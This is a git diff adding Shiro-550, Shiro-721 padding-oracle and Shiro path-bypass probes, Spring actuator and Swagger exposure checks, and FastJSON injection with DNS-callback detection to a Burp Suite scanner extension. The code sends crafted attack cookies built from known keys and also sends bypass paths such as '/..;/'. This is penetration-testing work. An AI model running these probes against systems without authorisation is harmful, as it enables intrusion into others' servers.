@@ -18,14 +18,23 @@ import burp.api.montoya.http.message.HttpRequestResponse;
 import burp.api.montoya.http.message.params.HttpParameter;
 import burp.api.montoya.http.message.params.HttpParameterType;
 import burp.api.montoya.http.message.requests.HttpRequest;
+import burp.api.montoya.http.message.responses.HttpResponse;
 import com.alibaba.fastjson2.JSONArray;
 import com.alibaba.fastjson2.JSONObject;
 
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import java.io.IOException;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
 import java.util.*;
+import java.util.Base64;
 import java.util.concurrent.ConcurrentHashMap;
 
 public class Scan {
@@ -35,7 +44,9 @@ public class Scan {
     Boolean logEnable;
     private SaveLogFile saveLogFile;
     Boolean cryptEnable;
-
+    // 记录已扫的shiro550和721，避免重复扫描
+    private final Set<String> scannedShiro550Hosts = new HashSet<>();
+    private final Set<String> scannedShiro721Hosts = new HashSet<>();
     public Scan(MontoyaApi montoyaApi,MySuiteTab mySuiteTab,PluginTaskExecutor executor) {
         this.montoyaApi = montoyaApi;
         this.mySuiteTab = mySuiteTab;
@@ -43,7 +54,6 @@ public class Scan {
         this.logEnable = DnslogConfig.getInstance().logEnabled;
         this.saveLogFile = new SaveLogFile(montoyaApi);
         this.cryptEnable = DnslogConfig.getInstance().cryptoEnabled;
-
     }
 
     /**
@@ -54,48 +64,48 @@ public class Scan {
     public void fastJsonScan(HttpRequestToBeSent request, List<JsonData> rawDatas) {
         String topDomain1 = "fjson";
         String topDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
-            try {
-                String timestamp = String.valueOf(System.currentTimeMillis());
-                Config config = new Config(timestamp,topDomain1+topDomain2,DnslogConfig.getInstance().collaboratorDomain);
-                // 解析Config类中的fastjsonPayload为JSONArray
-                JSONArray payloads = JSONArray.parseArray(config.fastjsonPayload);
-                // 遍历所有待替换的JSON数据（来自GET参数、POST参数、请求体）
-                for (JsonData rawData : rawDatas){
-                    // 循环遍历Payload集合，逐个发送
-                    for (int i = 0; i < payloads.size(); i++) {
+        try {
+            String timestamp = String.valueOf(System.currentTimeMillis());
+            Config config = new Config(timestamp,topDomain1+topDomain2,DnslogConfig.getInstance().collaboratorDomain);
+            // 解析Config类中的fastjsonPayload为JSONArray
+            JSONArray payloads = JSONArray.parseArray(config.fastjsonPayload);
+            // 遍历所有待替换的JSON数据（来自GET参数、POST参数、请求体）
+            for (JsonData rawData : rawDatas){
+                // 循环遍历Payload集合，逐个发送
+                for (int i = 0; i < payloads.size(); i++) {
 
-                        Object payloadObj = payloads.get(i);
-                        String payloadStr;
+                    Object payloadObj = payloads.get(i);
+                    String payloadStr;
 
-                        // 判断 Payload 类型：JSONObject 或 JSONArray
-                        if (payloadObj instanceof JSONObject) {
-                            payloadStr = ((JSONObject) payloadObj).toJSONString();
-                        } else if (payloadObj instanceof JSONArray) {
-                            payloadStr = ((JSONArray) payloadObj).toJSONString(); // 数组类型直接序列化
-                        } else {
-                            this.montoyaApi.logging().logToOutput("Payload[" + (i + 1) + "] 不是 JSON 对象/数组，跳过");
-                            continue;
-                        }
-//                        this.montoyaApi.logging().logToOutput("[DEBUG]payload: " + payloadStr);
-                        // 根据JSON数据来源位置，替换对应的部分
-                        HttpRequest modifiedRequest = replaceJsonInRequest(request, rawData, payloadStr);
-                        // 添加标记头
-                        modifiedRequest = modifiedRequest.withAddedHeader("JaySen-FastJson-Scan","true");
-                        // 发送修改后的请求
-                        HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);
-                        if (logEnable) {
-                            // 加入已发送请求的存储日志中
-                            saveLogFile.addToBatch(attackReqResp);
-                        }
-                        // 不立即检查DNSLOG，而是添加到批量缓存
-                        CheckDnslogResult.getInstance().addToBatch(topDomain2, attackReqResp);
-
+                    // 判断 Payload 类型：JSONObject 或 JSONArray
+                    if (payloadObj instanceof JSONObject) {
+                        payloadStr = ((JSONObject) payloadObj).toJSONString();
+                    } else if (payloadObj instanceof JSONArray) {
+                        payloadStr = ((JSONArray) payloadObj).toJSONString(); // 数组类型直接序列化
+                    } else {
+                        this.montoyaApi.logging().logToOutput("Payload[" + (i + 1) + "] 不是 JSON 对象/数组，跳过");
+                        continue;
                     }
+//                        this.montoyaApi.logging().logToOutput("[DEBUG]payload: " + payloadStr);
+                    // 根据JSON数据来源位置，替换对应的部分
+                    HttpRequest modifiedRequest = replaceJsonInRequest(request, rawData, payloadStr);
+                    // 添加标记头
+                    modifiedRequest = modifiedRequest.withAddedHeader("JaySen-FastJson-Scan","true");
+                    // 发送修改后的请求
+                    HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);
+                    if (logEnable) {
+                        // 加入已发送请求的存储日志中
+                        saveLogFile.addToBatch(attackReqResp);
+                    }
+                    // 不立即检查DNSLOG，而是添加到批量缓存
+                    CheckDnslogResult.getInstance().addToBatch(topDomain2, attackReqResp);
+
                 }
             }
-            catch (Exception e) {
-                this.montoyaApi.logging().logToError("FastJSON扫描过程出错：" + e.getMessage());
-            }
+        }
+        catch (Exception e) {
+            this.montoyaApi.logging().logToError("FastJSON扫描过程出错：" + e.getMessage());
+        }
     }
 
     // 参数类型改为List接口，提高灵活性
@@ -164,9 +174,9 @@ public class Scan {
     private HttpRequest replaceJsonInRequest(HttpRequest rawRequest, JsonData rawData, String payloadStr) {
         String encodedPayload = payloadStr;
         if (!cryptEnable){
-        // 对payload进行URL编码（适用于GET/POST参数，请求体JSON无需编码）
-        encodedPayload = URLEncoder.encode(payloadStr, StandardCharsets.UTF_8)
-                .replace("+", "%20"); // 确保空格编码为%20（符合URL规范）
+            // 对payload进行URL编码（适用于GET/POST参数，请求体JSON无需编码）
+            encodedPayload = URLEncoder.encode(payloadStr, StandardCharsets.UTF_8)
+                    .replace("+", "%20"); // 确保空格编码为%20（符合URL规范）
         }
         switch (rawData.getSourceType()) {
             case REQUEST_BODY:
@@ -313,21 +323,21 @@ public class Scan {
     }
 
     /**
-     * spring未授权访问扫描（优化版）
+     * spring未授权访问扫描
      */
     public void springScan(HttpRequestToBeSent request) {
         String originalUrl = request.url();
         String originalPath = request.withRemovedParameters(request.parameters()).path();
-        // 1. 先判断是否为潜在API URL，不是则直接返回
-        if (!UrlFilter.isPotentialApiUrl(originalUrl)) {
-//            montoyaApi.logging().logToOutput("跳过非API URL的spring扫描: " + originalUrl);
-            return;
-        }
+        //  先判断是否为潜在API URL，不是则直接返回
+         if (!UrlFilter.isPotentialApiUrl(originalUrl)) {
+ //            montoyaApi.logging().logToOutput("跳过非API URL的spring扫描: " + originalUrl);
+             return;
+         }
 
-        // 2. 常见的Spring扫描Payload（可在DnslogConfig中配置）
+        //  常见的Spring扫描Payload（可在DnslogConfig中配置）
         List<String> springPayloads = DnslogConfig.getInstance().getSpringPaths();
 
-        // 3. 拆分原始路径为片段，从子路径到根目录逐层扫描
+        //  拆分原始路径为片段，从子路径到根目录逐层扫描
         String[] pathSegments = originalPath.split("/");
         StringBuilder currentPath = new StringBuilder();
 
@@ -343,7 +353,7 @@ public class Scan {
                 try {
                     // 添加扫描标记头，避免重复扫描
                     HttpRequest scannedRequest = request
-                            .withAddedHeader("JaySen-spring-Scan", "true")
+                            .withAddedHeader("JaySen-Spring-Scan", "true")
                             .withPath(scanPath);
 
                     HttpRequestResponse attackReqResp = montoyaApi.http().sendRequest(scannedRequest);
@@ -355,7 +365,7 @@ public class Scan {
 
                     // 命中条件：状态码200且响应体包含特征
                     int respCode = attackReqResp.response().statusCode();
-                    if (respCode == 200 ||respCode == 302 || respCode == 301) {
+                    if (isRealSpringUnauth(attackReqResp.response(),payload)) {
                         executor.submit(() -> mySuiteTab.addRequestInfo(attackReqResp, "Spring未授权访问"));
                         montoyaApi.logging().logToOutput("发现Spring未授权访问: " + attackReqResp.request().url());
 
@@ -365,5 +375,433 @@ public class Scan {
                 }
             }
         }
+    }
+
+    /**
+     * 判断响应是否真正命中Spring未授权访问，避免仅靠状态码误报
+     * @param response 原始响应对象
+     * @param payload 当前扫描的Payload（如 /actuator）
+     * @return true表示确认为未授权访问
+     */
+    private boolean isRealSpringUnauth(HttpResponse response, String payload) {
+        int statusCode = response.statusCode();
+        // 仅处理200/301/302
+        if (statusCode != 200 && statusCode != 302 && statusCode != 301) {
+            return false;
+        }
+
+        String contentType = response.headerValue("Content-Type");
+        String location = response.headerValue("Location");
+        String body = null;
+        if (response.body() != null) {
+            try {
+                body = response.bodyToString();
+                if (body.length() > 8192) {
+                    body = body.substring(0, 8192); // 截取前8KB分析
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // ---- 通用黑名单过滤 ----
+        if (body != null) {
+            String lb = body.toLowerCase();
+            if (lb.contains("whitelabel error page") ||
+                    lb.contains("unauthorized") ||
+                    lb.contains("token expired") ||
+                    lb.contains("access denied") ||
+                    lb.contains("请登录") ||
+                    lb.contains("action=\"login\"") ||
+                    lb.contains("<input type=\"password\"")) {
+                return false;
+            }
+        }
+
+        // ---- 302/301 跳转过滤 ----
+        if ((statusCode == 302 || statusCode == 301) && location != null) {
+            String ll = location.toLowerCase();
+            if (ll.contains("login") || ll.contains("auth") || ll.contains("signin") || !location.startsWith("/")) {
+                return false; // 跳转到登录页或外域，视为需认证
+            }
+            // 如果 Payload 是 Druid 且跳转也含 login，已在上面捕获；其他管理端跳转可放行
+        }
+
+        // ---- 按 Payload 特征匹配 ----
+        String p = payload.toLowerCase();
+
+        // Actuator 系列
+        if (p.startsWith("/actuator")) {
+            if (statusCode == 200 && contentType != null && contentType.contains("json") && body != null) {
+                if (body.contains("\"_links\"") || body.contains("\"status\":")) {
+                    return true; // /actuator 或 /health 等
+                }
+                if (p.contains("env") && body.contains("propertySources")) return true;
+                if (p.contains("mappings") && body.contains("dispatcherServlets")) return true;
+                if (p.contains("configprops") && body.contains("beans")) return true;
+            }
+            return false;
+        }
+
+        // Swagger / API docs / Knife4j / Spring-UI
+        if (p.contains("swagger") || p.contains("api-docs") || p.contains("doc.html") ||
+                p.contains("knife4j") || p.contains("spring-ui") || p.contains("spring-resources") ||
+                p.contains("spring.json") || p.endsWith("/spring")) {
+
+            if (statusCode == 200 && body != null) {
+                // UI 页面
+                if ((body.contains("Swagger UI") || body.contains("swagger-ui")) &&
+                        (body.contains("swagger-ui.css") || body.contains("swagger-ui-standalone-preset"))) return true;
+                // JSON 文档
+                if (contentType != null && contentType.contains("json") &&
+                        (body.contains("\"swagger\":\"2.0\"") || body.contains("\"openapi\":\"") ||
+                                (body.contains("\"info\"") && body.contains("\"paths\"")) ||
+                                (body.contains("\"url\"") && body.contains("\"name\"")))) return true;
+                // Knife4j
+                if (body.contains("Knife4j") || body.contains("knife4j")) return true;
+                // spring-ui
+                if (body.contains("spring-ui") || body.contains("Spring UI")) return true;
+            }
+            // 允许跳转到同系列资源
+            if ((statusCode == 302 || statusCode == 301) && location != null &&
+                    (location.contains("swagger") || location.contains("api-docs") || location.contains("doc.html"))) {
+                return true;
+            }
+            return false;
+        }
+
+        // Druid 监控
+        if (p.contains("druid")) {
+            if (statusCode == 200 && body != null && body.contains("Druid Stat") && !body.contains("login")) return true;
+            if ((statusCode == 302 || statusCode == 301) && location != null && location.contains("druid") && !location.contains("login")) return true;
+            return false;
+        }
+
+        // webjars（低危，可按需记录）
+        if (p.contains("webjars")) {
+            if (statusCode == 200 && body != null && (body.contains("webjars") || body.contains("<title>Directory listing"))) return true;
+            return false;
+        }
+
+        // 未配置 Payload 的兜底：严格匹配 JSON + 常见关键字
+        if (statusCode == 200 && contentType != null && contentType.contains("json") && body != null &&
+                (body.contains("\"_links\"") || body.contains("\"swagger\"") || body.contains("\"openapi\""))) {
+            return true;
+        }
+
+        return false;
+    }
+
+    /***
+     扫描shiro漏洞
+     ***/
+    public void shiroScan(HttpRequestToBeSent request) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, IOException, NoSuchAlgorithmException, BadPaddingException, NoSuchFieldException, InvalidKeyException, IllegalAccessException {
+        HttpRequest newrequest = request.withAddedHeader("JaySen-Shiro-Scan","true");
+        String shiro550_flag = request.headerValue("JaySen-Shiro550-Scan");
+        String shiroBypass_flag = request.headerValue("JaySen-Shiro-Bypass-Scan");
+        String shiro721_flag = request.headerValue("JaySen-Shiro721-Scan");
+        // 若请求头无此字段 则赋值false
+        if (shiro550_flag == null) shiro550_flag = "false";
+        if (shiroBypass_flag == null) shiroBypass_flag = "false";
+        if (shiro721_flag == null) shiro721_flag = "false"; 
+        // shiro 550 721 权限绕过扫描
+        if (shiro550_flag.equals("false")) shiro550Scan(newrequest);
+        if (shiroBypass_flag.equals("false")) shiroBypassScan(newrequest);
+        if (shiro721_flag.equals("false")) shiro721Scan(newrequest);
+    }
+
+    /***
+     判断是否存在shiro框架
+     ***/
+    public Boolean isShiro(HttpRequestToBeSent request) {
+
+        // 避免无限递归
+        if (request.header("JaySen-isShiro") != null) {
+            return false;
+        }
+
+        try {
+            HttpRequest checkRequest = request
+                    .withRemovedHeader("Cookie")
+                    .withHeader("Cookie", "rememberMe=123")
+                    .withAddedHeader("JaySen-isShiro", "true");
+
+            var response = montoyaApi.http().sendRequest(checkRequest);
+            // 通过发送不正确的rememverMe参数在cookie，通过返回的Set-Cookie响应头判断
+            String setCookie = response.response().headerValue("Set-Cookie");
+            if (setCookie != null && setCookie.contains("rememberMe=deleteMe")) {
+                return true;
+            }
+        } catch (Throwable e) {
+            montoyaApi.logging().logToError("Shiro 框架判断异常: " + e.getMessage());
+        }
+
+        return false;
+    }
+
+    /***
+     shiro550漏洞扫描
+     ***/
+    private void shiro550Scan(HttpRequest request) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, IOException, NoSuchAlgorithmException, BadPaddingException, NoSuchFieldException, InvalidKeyException, IllegalAccessException {
+//        montoyaApi.logging().logToOutput("shiro550scan:"+request.url());
+        // 提取目标ip 端口 若已被扫描即略过
+        String target = extractHostPort(request.url());
+        if (!scannedShiro550Hosts.add(target)) {
+//            montoyaApi.logging().logToOutput("目标已shiro550扫描过:"+target);
+            return;
+        }
+        String topDomain1 = "shiro550";
+        String urldns;
+        // 初始化配置
+        String timestamp = String.valueOf(System.currentTimeMillis());
+        // 加载shirokeys
+        List<String> shiroKeys = DnslogConfig.getInstance().getShiroKeys();
+        if (shiroKeys == null) {
+            this.montoyaApi.logging().logToError("Shiro550 探测失败：Config未配置shirokeys");
+            return;
+        }
+
+        for (String shiroKey : shiroKeys) {
+            String topDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
+            // 初始化配置
+            Config config = new Config(timestamp,topDomain1+topDomain2,DnslogConfig.getInstance().collaboratorDomain);
+            // 确认dns类型
+            if (DnslogConfig.getInstance().donlogType == Config.DnslogType.COLLABORATOR) {
+                urldns = "https://" + topDomain1 + topDomain2 + "." + DnslogConfig.getInstance().collaboratorDomain;
+            } else {
+                urldns = "https://" + topDomain1 + topDomain2 + "." + DnslogConfig.getInstance().ceyeApiDomain;
+            }
+//            montoyaApi.logging().logToOutput(urldns);
+            String payload = config.generateShiro550Payload(urldns,shiroKey);
+            HttpRequest modifiedRequest = request.withRemovedHeader("Cookie").withHeader("Cookie","rememberMe="+payload).withAddedHeader("JaySen-shiroKey",shiroKey);
+            // 添加标记头
+            modifiedRequest = modifiedRequest.withAddedHeader("JaySen-Shiro550-Scan","true");
+            // 发送修改后的请求
+            HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);
+//            montoyaApi.logging().logToOutput(attackReqResp);
+            if (logEnable) {
+                // 加入已发送请求的存储日志中
+                saveLogFile.addToBatch(attackReqResp);
+            }
+            // 不立即检查DNSLOG，而是添加到批量缓存
+            CheckDnslogResult.getInstance().addToBatch(topDomain2,attackReqResp);
+        }
+        montoyaApi.logging().logToOutput("shiro550扫描完毕");
+    }
+    /**
+     * 从字符串中提取 HOST:PORT
+     * 例如：http://127.0.0.1:8088/login → 127.0.0.1:8088
+     */
+    public static String extractHostPort(String urlStr) {
+        if (urlStr == null || urlStr.isBlank()) {
+            return null;
+        }
+
+        try {
+            URL url = new URL(urlStr);
+            String host = url.getHost();
+            int port = url.getPort();
+
+            // 没有端口时只返回 host，有端口返回 host:port
+            if (port == -1) {
+                return host;
+            } else {
+                return host + ":" + port;
+            }
+        } catch (Exception e) {
+            // 格式不合法时返回 null
+            return null;
+        }
+    }
+    /***
+     shiro权限绕过扫描
+     通过构造特殊URL路径（如 /..;/ /;/ 等）绕过Shiro权限校验
+     ***/
+    private void shiroBypassScan(HttpRequest request) {
+        String originalPath = request.path();
+
+        List<String> bypassPatterns = Arrays.asList(
+            "/..;/",
+            "/;/",
+            "/%20/",
+            "/./",
+            "//"
+        );
+
+        HttpRequestResponse baselineResp = null;
+        try {
+            HttpRequest baselineRequest = request.withAddedHeader("JaySen-Shiro-Bypass-Scan", "true");
+            baselineResp = this.montoyaApi.http().sendRequest(baselineRequest);
+            if (logEnable) {
+                saveLogFile.addToBatch(baselineResp);
+            }
+        } catch (Exception e) {
+            this.montoyaApi.logging().logToError("Shiro绕过扫描-请求发送失败：" + e.getMessage());
+            return;
+        }
+
+        int baselineStatus = baselineResp.response().statusCode();
+        String baselineBody = null;
+        try {
+            if (baselineResp.response().body() != null) {
+                baselineBody = baselineResp.response().bodyToString();
+                if (baselineBody.length() > 8192) {
+                    baselineBody = baselineBody.substring(0, 8192);
+                }
+            }
+        } catch (Exception ignored) {}
+
+        for (String pattern : bypassPatterns) {
+            try {
+                String decodedPattern = java.net.URLDecoder.decode(pattern, "UTF-8");
+                String bypassPath;
+                if (originalPath.startsWith("/")) {
+                    bypassPath = "/" + decodedPattern.replaceAll("^/", "") + originalPath.substring(1);
+                } else {
+                    bypassPath = "/" + decodedPattern.replaceAll("^/", "");
+                }
+
+                HttpRequest bypassRequest = request
+                    .withAddedHeader("JaySen-Shiro-Bypass-Scan", "true")
+                    .withPath(bypassPath);
+
+                HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(bypassRequest);
+
+                if (logEnable) {
+                    saveLogFile.addToBatch(attackReqResp);
+                }
+
+                int statusCode = attackReqResp.response().statusCode();
+                String bypassBody = null;
+                try {
+                    if (attackReqResp.response().body() != null) {
+                        bypassBody = attackReqResp.response().bodyToString();
+                        if (bypassBody.length() > 8192) {
+                            bypassBody = bypassBody.substring(0, 8192);
+                        }
+                    }
+                } catch (Exception ignored) {}
+
+                if (isShiroBypass(baselineStatus, baselineBody, statusCode, bypassBody)) {
+                    executor.submit(() -> mySuiteTab.addRequestInfo(attackReqResp, "Shiro权限绕过"));
+                    montoyaApi.logging().logToOutput("发现Shiro权限绕过: " + attackReqResp.request().url());
+                    return;
+                }
+
+            } catch (Exception e) {
+                this.montoyaApi.logging().logToError("Shiro绕过扫描出错（模式：" + pattern + "）：" + e.getMessage());
+            }
+        }
+
+        montoyaApi.logging().logToOutput("shiro权限绕过扫描完毕");
+    }
+
+    private boolean isShiroBypass(int baselineStatus, String baselineBody, int bypassStatus, String bypassBody) {
+        if (bypassStatus != 200) {
+            return false;
+        }
+
+        if (baselineStatus == 200) {
+            if (baselineBody != null && bypassBody != null && !baselineBody.equals(bypassBody)) {
+                return true;
+            }
+            return false;
+        }
+
+        if (baselineStatus == 302 || baselineStatus == 301 || baselineStatus == 403 || baselineStatus == 401) {
+            if (bypassBody != null) {
+                String lb = bypassBody.toLowerCase();
+                if (lb.contains("login") || lb.contains("auth") || lb.contains("请登录") ||
+                    lb.contains("unauthorized") || lb.contains("access denied")) {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        return false;
+    }
+
+    /***
+     shiro721 Padding Oracle漏洞检测
+     篡改rememberMe密文末尾字节，通过deleteMe响应判断是否存在Padding Oracle
+     ***/
+    private void shiro721Scan(HttpRequest request) {
+        String cookieHeader = request.headerValue("Cookie");
+        String rememberMe = null;
+        if (cookieHeader != null && !cookieHeader.isEmpty()) {
+            java.util.regex.Matcher m = java.util.regex.Pattern
+                .compile("rememberMe=([^;]+)")
+                .matcher(cookieHeader);
+            if (m.find()) {
+                rememberMe = m.group(1);
+            }
+        }
+        if (rememberMe == null || rememberMe.isEmpty()) {
+            montoyaApi.logging().logToOutput("无rememberMe cookie，跳过Shiro721检测");
+            return;
+        }
+
+        byte[] ciphertext;
+        try {
+            ciphertext = Base64.getDecoder().decode(rememberMe);
+        } catch (IllegalArgumentException e) {
+            this.montoyaApi.logging().logToOutput("Shiro721: rememberMe Base64解码失败，跳过");
+            return;
+        }
+        if (ciphertext.length < 32) return;
+
+        String hostPort = extractHostPort(request.url());
+        if (!scannedShiro721Hosts.add(hostPort)) return;
+
+        // 基线检测：发送原始请求，如果原始cookie已过期则跳过
+        HttpRequestResponse baselineResp;
+        try {
+            HttpRequest baselineRequest = request
+                .withAddedHeader("JaySen-Shiro721-Scan", "true");
+            baselineResp = this.montoyaApi.http().sendRequest(baselineRequest);
+        } catch (Exception e) {
+            this.montoyaApi.logging().logToError("Shiro721基线请求发送失败：" + e.getMessage());
+            return;
+        }
+        String baselineSetCookie = baselineResp.response().headerValue("Set-Cookie");
+        if (baselineSetCookie != null && baselineSetCookie.contains("rememberMe=deleteMe")) {
+            montoyaApi.logging().logToOutput("Shiro721: 原始session已过期，跳过检测");
+            return;
+        }
+
+        // 篡改末尾3个字节，至少2个命中才报
+        int hitCount = 0;
+        for (int pos = ciphertext.length - 1; pos >= ciphertext.length - 3; pos--) {
+            try {
+                byte[] tampered = ciphertext.clone();
+                tampered[pos] ^= 0xFF;
+
+                String tamperedCookie = Base64.getEncoder().encodeToString(tampered);
+                HttpRequest modifiedRequest = request
+                    .withRemovedHeader("Cookie")
+                    .withHeader("Cookie", "rememberMe=" + tamperedCookie)
+                    .withAddedHeader("JaySen-Shiro721-Scan", "true");
+
+                HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);
+
+                if (logEnable) {
+                    saveLogFile.addToBatch(attackReqResp);
+                }
+
+                String setCookie = attackReqResp.response().headerValue("Set-Cookie");
+                if (setCookie != null && setCookie.contains("rememberMe=deleteMe")) {
+                    hitCount++;
+                }
+            } catch (Exception e) {
+                this.montoyaApi.logging().logToError("Shiro721检测出错（位置：" + pos + "）：" + e.getMessage());
+            }
+        }
+
+        if (hitCount >= 2) {
+            // 篡改密文后Shiro仍然反序列化 → Padding Oracle 确认存在
+            executor.submit(() -> mySuiteTab.addRequestInfo(baselineResp, "shiro721反序列化"));
+            montoyaApi.logging().logToOutput("发现Shiro-721反序列化漏洞（Padding Oracle确认）: " + request.url());
+        }
+
+        montoyaApi.logging().logToOutput("shiro721检测完毕");
     }
 }
